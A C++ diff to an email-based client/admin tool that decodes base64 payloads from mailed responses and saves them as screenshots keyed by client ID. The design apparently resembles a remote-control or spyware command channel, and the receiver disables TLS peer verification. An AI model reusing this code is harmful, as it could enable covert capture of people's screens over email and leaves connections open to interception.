@@ -5,12 +5,52 @@ string smtpURL = "smtp://smtp.gmail.com:587";
 string email_payload_text = "";
 string confirmation_payload_text = "";
 
+string base64_encode(const string& input) {
+	string output;
+	int val = 0, valb = -6;
+	for (unsigned char c : input) {
+		val = (val << 8) + c;
+		valb += 8;
+		while (valb >= 0) {
+			output.push_back(base64_chars[(val >> valb) & 0x3F]);
+			valb -= 6;
+		}
+	}
+	if (valb > -6) output.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
+	while (output.size() % 4) output.push_back('=');
+	return output;
+}
+
+string base64_decode(const string& input) {
+	vector<int> T(256, -1);
+	for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;
+	string output;
+	int val = 0, valb = -8;
+	for (unsigned char c : input) {
+		if (T[c] == -1) break;
+		val = (val << 6) + T[c];
+		valb += 6;
+		if (valb >= 0) {
+			output.push_back(char((val >> valb) & 0xFF));
+			valb -= 8;
+		}
+	}
+	return output;
+}
 size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
-	((string*)userp)->append((char*)contents, size * nmemb);
-	return size * nmemb;
+	size_t totalSize = size * nmemb;
+	string* buffer = static_cast<string*>(userp);
+	buffer->append(static_cast<char*>(contents), totalSize);
+	return totalSize;
 }
 void ExtractEmailBody(string& buffer) {
 	size_t bodyStart = buffer.find("\r\n\r\n");
+	size_t next = buffer.find("\r\n\r\n", bodyStart + 4);
+	while (next != -1) {
+		bodyStart = next;
+		next = buffer.find("\r\n\r\n", bodyStart + 4);
+	}
+	cout << "Size of email reding: " << bodyStart << endl;
 	buffer = buffer.substr(0, bodyStart);
 }
 
@@ -87,6 +127,7 @@ void MyCurl::InitReceiverSession(string& URL) {
 	curl_easy_setopt(receiver, CURLOPT_USE_SSL, CURLUSESSL_ALL);
 	curl_easy_setopt(receiver, CURLOPT_SSL_VERIFYPEER, 1L);
 	curl_easy_setopt(receiver, CURLOPT_SSL_VERIFYHOST, 2L);
+	curl_easy_setopt(receiver, CURLOPT_TRANSFERTEXT, 0L);
 	curl_easy_setopt(receiver, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
 	curl_easy_setopt(receiver, CURLOPT_SSL_VERIFYPEER, 0L);
 	curl_easy_setopt(receiver, CURLOPT_WRITEFUNCTION, WriteCallback);
@@ -165,7 +206,8 @@ void MyCurl::Preprocess() {
 	end = emailContent.find(';', start);
 	query = emailContent.substr(start, end - start);
 	start = end + 1;
-	subContent = emailContent.substr(start);
+	end = emailContent.find(';', start);
+	subContent = emailContent.substr(start, end - start);
 }
 void MyCurl::ClientProcess() {
 	int queryInt = stoi(query);
@@ -184,23 +226,28 @@ void MyCurl::ClientProcess() {
 			}
 		}
 	}
+	else if (queryInt == 17) {
+
+	}
 }
 void MyCurl::AdminProcess(const vector<string> IDs, const int query) {
 	unordered_set<string> IDSet;
 	for (auto& ID : IDs) {
 		IDSet.insert(ID);
 	}
-	while (IDs.size() != 0) {
+	while (IDSet.size() != 0) {
 		while (!emailQueue.empty()) {
 			Preprocess();
 			if (IDSet.find(receiverID) != IDSet.end()) {
 				if (stoi(this->query) == query) {
 					if (query == 22) { //More query
+						subContent = base64_decode(subContent);
 						fstream file("_Data/screenshot" + receiverID + ".jpg", ios::out | ios::binary);
 						file << subContent;
 						file.close();
 						cout << "Saved screenshot of " + receiverID;
 					}
+					IDSet.erase(receiverID);
 				}
 			}
 			else {
